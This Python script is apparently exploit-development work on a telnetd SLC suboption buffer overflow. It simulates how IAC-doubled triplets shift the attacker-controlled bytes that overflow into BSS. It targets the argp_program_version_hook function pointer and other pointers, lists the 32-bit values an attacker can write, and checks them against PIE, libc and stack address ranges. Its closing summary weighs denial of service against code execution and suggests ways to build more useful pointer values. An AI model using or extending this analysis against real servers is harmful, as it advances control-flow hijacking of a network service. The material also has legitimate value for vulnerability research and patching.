#!/usr/bin/env python3
"""
IAC Doubling Alignment Analysis for telnetd-32 SLC Overflow
============================================================

Simulates the add_slc() buffer write process to understand how IAC doubling
(func=0xFF -> writes 4 bytes instead of 3) shifts alignment of controlled values
at critical BSS offsets.

BSS layout past slcbuf (offset from slcbuf start):
  +108 (0x21f8c) buf.0                    (5 bytes)
  +116 (0x21f94) argp_program_bug_address  (4 bytes, ptr)
  +120 (0x21f98) _argp_hang               (4 bytes)
  +124 (0x21f9c) argp_program_version     (4 bytes, ptr)
  +128 (0x21fa0) argp_program_version_hook (4 bytes, FUNCTION POINTER!)
  +132 (0x21fa4) program_canonical_name   (4 bytes, ptr)
  +136 (0x21fa8) program_authors          (4 bytes, ptr)
  +140 (0x21fac) program_name             (4 bytes, ptr - dereferenced)
  +160 (0x21fc0) rpl_optarg               (4 bytes, ptr)
  +192 (0x21fe0) getopt_data              (36 bytes)
  +228 (0x22004) _end
"""

import struct
import itertools

NSLC = 0x12  # 18
SLCBUF_SIZE = 108
HEADER_SIZE = 4  # IAC SB LINEMODE SLC header bytes in slcbuf

# Critical targets (offset from slcbuf start)
TARGETS = {
    128: "argp_program_version_hook (FUNC PTR!)",
    132: "program_canonical_name",
    136: "program_authors",
    140: "program_name (PTR, dereferenced)",
    160: "rpl_optarg",
}


def simulate_add_slc(triplets):
    """
    Simulate the add_slc() buffer write process.

    Input: list of (func, flag, value) triplets as sent by client.

    For each triplet:
      - If func > NSLC (0x12): server writes (func, SLC_NOSUPPORT=0, 0) = 3 bytes
      - If func == 0xFF: the func byte gets IAC-doubled: writes (0xFF, 0xFF, 0, 0) = 4 bytes
      - If func <= NSLC: writes (func, flag|SLC_ACK=0x80, value) = 3 bytes
        (we approximate with controllable flag and value)

    Returns: bytearray representing slcbuf contents starting from offset 4 (after header)
    """
    buf = bytearray()

    for func, flag, value in triplets:
        if func == 0xFF:
            # IAC doubling: add_slc writes func byte, which is 0xFF
            # In the output buffer, 0xFF gets doubled to 0xFF 0xFF
            # Then flag (SLC_NOSUPPORT=0) and value (0) follow
            # Actually: add_slc does *slcptr++ = func; if func==0xFF, *slcptr++=0xFF
            # then *slcptr++ = flag; *slcptr++ = value
            buf.extend([0xFF, 0xFF, 0x00, 0x00])  # 4 bytes
        elif func > NSLC:
            # Unknown func: server responds with SLC_NOSUPPORT
            buf.extend([func, 0x00, 0x00])  # 3 bytes
        else:
            # Known func: server sets SLC_ACK bit
            # The flag and value come from the server's SLC table (not our input)
            # But for func <= NSLC, the server has configured values
            # Approximate: flag = slctab[func].defset.flag | SLC_ACK
            # value = slctab[func].defset.val
            # These are typically small values like 0x03, 0x1c, etc.
            buf.extend([func, flag | 0x80, value])  # 3 bytes

    return buf


def analyze_alignment():
    """Analyze what values land at critical BSS offsets."""

    print("=" * 70)
    print("IAC DOUBLING ALIGNMENT ANALYSIS")
    print("=" * 70)
    print()
    print("slcbuf layout: [4-byte header][triplet data...]")
    print("Data starts at slcbuf offset 4")
    print("Overflow past slcbuf starts at data offset 104 (slcbuf offset 108)")
    print()

    # Part 1: Basic triplet math
    print("-" * 70)
    print("PART 1: How many triplets to reach each target?")
    print("-" * 70)
    print()
    print("With N triplets of 3 bytes each, data fills offsets 4..4+3N-1")
    print("With K IAC-doubled triplets (4 bytes each), total = 3*(N-K) + 4*K = 3N+K bytes")
    print("Target offset T is reached when: 4 + 3N + K = T  =>  3N + K = T - 4")
    print()

    for target_off, name in sorted(TARGETS.items()):
        data_off = target_off - HEADER_SIZE  # offset within data portion
        print(f"  Target: offset {target_off} ({name})")
        print(f"    Data offset needed: {data_off}")
        # Without IAC: N = data_off / 3
        n_no_iac = data_off / 3
        print(f"    Without IAC (K=0): N = {data_off}/3 = {n_no_iac:.1f}", end="")
        if data_off % 3 == 0:
            print(f" -> exactly {data_off//3} triplets")
        else:
            print(f" -> NOT aligned! {data_off//3} triplets = {(data_off//3)*3} bytes, off by {data_off % 3}")

        # With IAC doublings
        print(f"    With K IAC doublings: need 3*(N-K) + 4*K = {data_off}  =>  3N + K = {data_off}")
        solutions = []
        for k in range(0, 20):
            remaining = data_off - k
            if remaining >= 0 and remaining % 3 == 0:
                n = remaining // 3
                if k <= n:  # Can't have more IAC triplets than total
                    solutions.append((n, k))
        if solutions:
            for n, k in solutions[:5]:
                print(f"      N={n:3d} total triplets, K={k:2d} IAC-doubled -> lands EXACTLY at offset {target_off}")
        else:
            print(f"      No exact alignment possible!")
        print()

    # Part 2: Detailed simulation - what bytes land at each target?
    print("-" * 70)
    print("PART 2: Byte-level analysis at critical offsets")
    print("-" * 70)
    print()

    # We need to understand: what 4-byte value ends up at each target offset?
    # The overflow region starts at data offset 104 (slcbuf offset 108)
    # Before that, we fill slcbuf with triplets

    # Strategy: Use ~35 triplets to fill slcbuf, then continue overflowing
    # The first 34 triplets (func=0x13..0x44) fill 102 bytes (offset 4..105)
    # Triplet 35 starts at offset 106, its byte[2] lands at offset 108 = overflow start

    print("Strategy: Fill with func > NSLC triplets, sprinkle IAC (0xFF) at specific positions")
    print()

    for target_off, name in sorted(TARGETS.items()):
        print(f"\n  === Target: offset {target_off} ({name}) ===")
        data_needed = target_off - HEADER_SIZE  # bytes of data to reach target

        # Try different numbers of IAC-doubled triplets
        best_results = []

        for num_iac in range(0, 15):
            # Total data bytes = 3*(N-num_iac) + 4*num_iac = 3*N + num_iac
            # We need data to reach and cover the target (4 bytes)
            # The triplet that starts writing AT data_needed is what we care about

            # Need: sum of triplet sizes up to triplet i-1 = data_needed
            # With K IAC triplets before position i: 3*(i-K) + 4*K = data_needed
            # => 3*i + K = data_needed

            if (data_needed - num_iac) % 3 != 0:
                # Can't align exactly with this many IACs
                # Check what byte of a triplet lands here
                remainder = (data_needed - num_iac) % 3
                total_triplets = (data_needed - num_iac) // 3

                # The value at the target depends on which byte of the triplet we're in
                # remainder=1 means we're at byte[1] of a triplet (the flag byte)
                # remainder=2 means we're at byte[2] of a triplet (the value byte)

                best_results.append({
                    'num_iac': num_iac,
                    'aligned': False,
                    'remainder': remainder,
                    'triplets_before': total_triplets,
                    'note': f'Mid-triplet, byte[{remainder}]'
                })
            else:
                total_triplets = (data_needed - num_iac) // 3
                if num_iac <= total_triplets:
                    best_results.append({
                        'num_iac': num_iac,
                        'aligned': True,
                        'remainder': 0,
                        'triplets_before': total_triplets,
                        'note': f'Aligned! Triplet {total_triplets} starts here'
                    })

        for r in best_results[:8]:
            marker = " <<<" if r['aligned'] else ""
            print(f"    K={r['num_iac']:2d} IACs: {r['note']}, N={r['triplets_before']}{marker}")

    # Part 3: Full simulation with specific triplet sequences
    print()
    print("-" * 70)
    print("PART 3: Full buffer simulation - exact bytes at targets")
    print("-" * 70)
    print()

    # Build a realistic sequence and trace every byte
    for num_iac_positions in range(0, 8):
        # Place IAC triplets at the end (just before overflow zone)
        # Total triplets: enough to reach past program_name (offset 144 = 140+4)
        # Need at least (144-4)/3 = 47 triplets (no IAC) -> 141 bytes

        # Strategy: place IAC triplets at various positions
        # Each IAC shifts everything after it by +1 byte

        total_data_target = 164  # reach past rpl_optarg (offset 160+4)
        # With num_iac_positions IAC triplets: 3*(N - num_iac_positions) + 4*num_iac_positions = total_data_target
        # N = (total_data_target - num_iac_positions) / 3

        if (total_data_target - num_iac_positions) % 3 != 0:
            continue

        N = (total_data_target - num_iac_positions) // 3
        if num_iac_positions > N:
            continue

        # Build triplet list
        triplets = []
        func_counter = NSLC + 1  # Start at 0x13
        iac_positions = set()

        # Place IAC triplets at specific positions (near the overflow boundary)
        # The overflow starts around triplet 35
        for i in range(num_iac_positions):
            # Place IACs at positions 30+i (just before overflow)
            iac_positions.add(30 + i)

        for i in range(N):
            if i in iac_positions:
                triplets.append((0xFF, 0x00, 0x00))
            else:
                func = func_counter
                if func >= 0xFF:
                    func = 0xFE
                func_counter += 1
                if func_counter >= 0xFF:
                    func_counter = NSLC + 1
                triplets.append((func, 0x00, 0x00))

        # Simulate
        buf = simulate_add_slc(triplets)

        # Check what's at each target
        print(f"  === {num_iac_positions} IAC-doubled triplets (at positions {sorted(iac_positions) if iac_positions else 'none'}) ===")
        print(f"      Total triplets: {N}, Total data bytes: {len(buf)}")

        for target_off, name in sorted(TARGETS.items()):
            data_idx = target_off - HEADER_SIZE
            if data_idx + 4 <= len(buf):
                val_bytes = buf[data_idx:data_idx+4]
                val = struct.unpack('<I', val_bytes)[0]
                print(f"      Offset {target_off:3d} ({name[:40]:40s}): "
                      f"bytes={val_bytes.hex()} val=0x{val:08x}")
            else:
                print(f"      Offset {target_off:3d} ({name[:40]:40s}): "
                      f"not reached (need {data_idx+4}, have {len(buf)})")
        print()

    # Part 4: Explore what pointer values we can construct
    print("-" * 70)
    print("PART 4: Achievable pointer values at argp_program_version_hook (offset 128)")
    print("-" * 70)
    print()

    # The key insight: each byte in the overflow is either:
    # - A func byte (0x13-0xFE, or 0xFF doubled)
    # - A flag byte (0x00 for SLC_NOSUPPORT for func > NSLC)
    # - A value byte (0x00 for func > NSLC)
    #
    # For func <= NSLC, the flag and value come from server's slctab
    # For func > NSLC, flag=0 and value=0 always
    # For func == 0xFF, we get 0xFF 0xFF 0x00 0x00

    print("Byte constraints in overflow zone (func > NSLC triplets):")
    print("  Byte pattern: [func, 0x00, 0x00, func, 0x00, 0x00, ...]")
    print("  func can be 0x13-0xFE (or 0xFF -> doubled to FF FF)")
    print("  flag/value bytes are ALWAYS 0x00 for unknown funcs")
    print()

    # For offset 128 (version_hook), we need 124 bytes of data to reach it
    # 124 = 3*N + K, solutions: K=1,N=41; K=4,N=40; K=7,N=39; etc.

    print("At offset 128 (argp_program_version_hook):")
    target_data = 124  # data bytes needed

    achievable = set()

    for k in range(0, 15):
        if (target_data - k) % 3 != 0:
            # Not aligned - byte lands mid-triplet
            rem = (target_data - k) % 3
            n_before = (target_data - k) // 3

            if rem == 1:
                # Target starts at byte[1] of a triplet = flag byte = 0x00
                # Bytes at target: [0x00, 0x00, func_next, 0x00]
                # The 4 bytes: 00 00 XX 00 where XX = next func
                for func in range(0x13, 0x100):
                    if func == 0xFF:
                        val = struct.unpack('<I', bytes([0x00, 0x00, 0xFF, 0xFF]))[0]
                    else:
                        val = struct.unpack('<I', bytes([0x00, 0x00, func, 0x00]))[0]
                    achievable.add((val, k, f"rem=1, next_func=0x{func:02x}"))
            elif rem == 2:
                # Target starts at byte[2] of a triplet = value byte = 0x00
                # Bytes at target: [0x00, func_next, 0x00, 0x00]
                for func in range(0x13, 0x100):
                    if func == 0xFF:
                        val = struct.unpack('<I', bytes([0x00, 0xFF, 0xFF, 0x00]))[0]
                    else:
                        val = struct.unpack('<I', bytes([0x00, func, 0x00, 0x00]))[0]
                    achievable.add((val, k, f"rem=2, next_func=0x{func:02x}"))
        else:
            # Aligned - target starts at byte[0] of a triplet = func byte
            n = target_data // 3 - (k - k)  # simplified
            # Bytes at target: [func, 0x00, 0x00, func_next/0x00]
            for func in range(0x13, 0x100):
                for func_next in range(0x13, 0x100):
                    if func == 0xFF:
                        # 4 bytes: FF FF 00 00
                        val = struct.unpack('<I', bytes([0xFF, 0xFF, 0x00, 0x00]))[0]
                    else:
                        # 4 bytes: func 00 00 func_next (if next isn't IAC)
                        if func_next == 0xFF:
                            val = struct.unpack('<I', bytes([func, 0x00, 0x00, 0xFF]))[0]
                        else:
                            val = struct.unpack('<I', bytes([func, 0x00, 0x00, func_next]))[0]
                    achievable.add((val, k, ""))
                break  # Only need one func_next to enumerate patterns

    # Deduplicate and find interesting values
    unique_vals = sorted(set(v for v, _, _ in achievable))

    print(f"  Total unique achievable 32-bit values: {len(unique_vals)}")
    print()

    # Check against known address ranges
    print("  Checking against 32-bit PIE address ranges:")
    print("    PIE base: 0x5650XXXX - 0x56FFFFFF (8-bit entropy)")
    print("    libc:     0xF7XXXXXX")
    print("    stack:    0xFFXXXXXX")
    print()

    pie_hits = [v for v in unique_vals if 0x56500000 <= v <= 0x56FFFFFF]
    libc_hits = [v for v in unique_vals if 0xF7000000 <= v <= 0xF7FFFFFF]
    stack_hits = [v for v in unique_vals if 0xFF000000 <= v <= 0xFFFFFFFF]

    print(f"    PIE range hits: {len(pie_hits)}")
    if pie_hits:
        for v in pie_hits[:10]:
            print(f"      0x{v:08x}")

    print(f"    libc range hits: {len(libc_hits)}")
    if libc_hits:
        for v in libc_hits[:10]:
            print(f"      0x{v:08x}")

    print(f"    stack range hits: {len(stack_hits)}")
    if stack_hits:
        for v in stack_hits[:10]:
            print(f"      0x{v:08x}")

    # Part 5: Detailed byte patterns for each alignment
    print()
    print("-" * 70)
    print("PART 5: All possible 4-byte patterns at each target offset")
    print("-" * 70)
    print()

    for target_off in [128, 140]:
        name = TARGETS.get(target_off, "unknown")
        data_off = target_off - HEADER_SIZE
        print(f"  Target offset {target_off} ({name}):")
        print(f"    Data offset: {data_off}")
        print()

        patterns = {}  # alignment_type -> list of (pattern_hex, value, description)

        for k in range(0, 12):
            remainder = (data_off - k) % 3

            if remainder == 0:
                # Aligned: [func, 0, 0, ...]
                # Next byte depends on whether next triplet is IAC
                desc_prefix = f"K={k:2d} (aligned)"

                # Pattern: func 00 00 <next_func_byte>
                # func can be 0x13-0xFE
                example_patterns = []
                for func in [0x13, 0x41, 0x80, 0xFE, 0xFF]:
                    if func == 0xFF:
                        p = bytes([0xFF, 0xFF, 0x00, 0x00])
                    else:
                        # Next byte is start of next triplet
                        for nf in [0x13, 0x41, 0xFE, 0xFF]:
                            if nf == 0xFF:
                                p = bytes([func, 0x00, 0x00, 0xFF])
                            else:
                                p = bytes([func, 0x00, 0x00, nf])
                            val = struct.unpack('<I', p)[0]
                            example_patterns.append((p.hex(), val, f"func=0x{func:02x}, next=0x{nf:02x}"))

                patterns[f"K={k:2d}, rem=0"] = example_patterns

            elif remainder == 1:
                # Mid-triplet byte[1]: [0, 0, func_next, ...]
                desc_prefix = f"K={k:2d} (byte[1])"
                example_patterns = []
                for nf in [0x13, 0x41, 0x80, 0xFE, 0xFF]:
                    if nf == 0xFF:
                        p = bytes([0x00, 0x00, 0xFF, 0xFF])
                    else:
                        p = bytes([0x00, 0x00, nf, 0x00])
                    val = struct.unpack('<I', p)[0]
                    example_patterns.append((p.hex(), val, f"next_func=0x{nf:02x}"))
                patterns[f"K={k:2d}, rem=1"] = example_patterns

            elif remainder == 2:
                # Mid-triplet byte[2]: [0, func_next, 0, 0]
                desc_prefix = f"K={k:2d} (byte[2])"
                example_patterns = []
                for nf in [0x13, 0x41, 0x80, 0xFE, 0xFF]:
                    if nf == 0xFF:
                        p = bytes([0x00, 0xFF, 0xFF, 0x00])
                    else:
                        p = bytes([0x00, nf, 0x00, 0x00])
                    val = struct.unpack('<I', p)[0]
                    example_patterns.append((p.hex(), val, f"next_func=0x{nf:02x}"))
                patterns[f"K={k:2d}, rem=2"] = example_patterns

        for align_key, pats in sorted(patterns.items()):
            print(f"    {align_key}:")
            for hex_pat, val, desc in pats:
                pie_note = ""
                if 0x56500000 <= val <= 0x56FFFFFF:
                    pie_note = " << PIE RANGE!"
                elif 0xF7000000 <= val <= 0xF7FFFFFF:
                    pie_note = " << LIBC RANGE!"
                elif val == 0:
                    pie_note = " << NULL"
                print(f"      {hex_pat} = 0x{val:08x} ({desc}){pie_note}")
            print()

    # Part 6: Key insight summary
    print("=" * 70)
    print("SUMMARY OF KEY FINDINGS")
    print("=" * 70)
    print()
    print("1. BYTE CONTROL: In the overflow zone, only func bytes are controllable.")
    print("   Flag and value bytes for func > NSLC are ALWAYS 0x00.")
    print("   This gives pattern: [XX, 00, 00, YY, 00, 00, ...] where XX,YY in 0x13-0xFF")
    print()
    print("2. IAC DOUBLING EFFECT: Each 0xFF func expands to [FF, FF, 00, 00] (4 bytes)")
    print("   This shifts subsequent bytes by +1, changing alignment at targets.")
    print()
    print("3. ALIGNMENT AT offset 128 (argp_program_version_hook):")
    data_off = 124
    for k in range(4):
        rem = (data_off - k) % 3
        print(f"   K={k}: remainder={rem} -> ", end="")
        if rem == 0:
            print("bytes [func, 00, 00, next_func] -> max val ~ 0xFE0000FE")
        elif rem == 1:
            print("bytes [00, 00, func, 00/FF]    -> max val ~ 0xFFFF0000")
        elif rem == 2:
            print("bytes [00, func, 00, 00]       -> max val ~ 0x0000FE00")

    print()
    print("4. ALIGNMENT AT offset 140 (program_name):")
    data_off = 136
    for k in range(4):
        rem = (data_off - k) % 3
        print(f"   K={k}: remainder={rem} -> ", end="")
        if rem == 0:
            print("bytes [func, 00, 00, next_func] -> val ~ 0xYY0000XX")
        elif rem == 1:
            print("bytes [00, 00, func, 00/FF]    -> val ~ 0x00XX0000 or 0xFFFF0000")
        elif rem == 2:
            print("bytes [00, func, 00, 00]       -> val ~ 0x0000XX00")

    print()
    print("5. PLAUSIBLE ADDRESS CHECK:")
    print("   PIE text (0x565XXXXX): Need bytes like [XX, XX, 65, 56]")
    print("     Achievable? Need 0x56 at byte[3] and 0x65 at byte[2]")
    print("     0x56 is in valid func range (0x13-0xFE) -> YES as a func byte")
    print("     0x65 is in valid func range -> YES")
    print("     Pattern needed: rem=0 -> [func, 00, 00, 0x56] with func at LSB")
    print("                     -> val = 0x560000XX, close but byte[2] always 0x65?")
    print("     Actually: [XX, 00, 00, 0x56] = 0x560000XX where XX=func")
    print("     This gives 0x56000013 to 0x560000FE - NOT in PIE text range")
    print("     PIE text is around 0x5650XXXX+, so we need upper bytes = 0x5650+")
    print("     -> NOT achievable with 2 zero bytes in the middle!")
    print()
    print("   Conclusion: The zero bytes (from flag/value = 0x00) prevent constructing")
    print("   valid code/data addresses. Every 4-byte value has at least 2 zero bytes.")
    print("   This means argp_program_version_hook cannot be pointed to valid code.")
    print()
    print("   HOWEVER: A non-null version_hook causes call *%eax where eax = version_hook value.")
    print("   If version_hook is non-zero but points to unmapped memory -> CRASH (DoS).")
    print("   If we could find a useful gadget at an address with 2 zero bytes -> code exec.")
    print()
    print("6. ALTERNATIVE: func <= NSLC triplets have SERVER-CONTROLLED flag/value bytes!")
    print("   For func in 0x01-0x12, the server writes its configured SLC values.")
    print("   The default SLC values include bytes like 0x03 (SIGINT), 0x1c (SIGQUIT),")
    print("   0x04 (EOF), 0x17 (ERASE), etc. These are still small, but non-zero.")
    print("   If we send func <= NSLC at strategic positions, we get non-zero flag/value bytes")
    print("   from the server's SLC table, potentially forming more useful pointer values.")


if __name__ == "__main__":
    analyze_alignment()
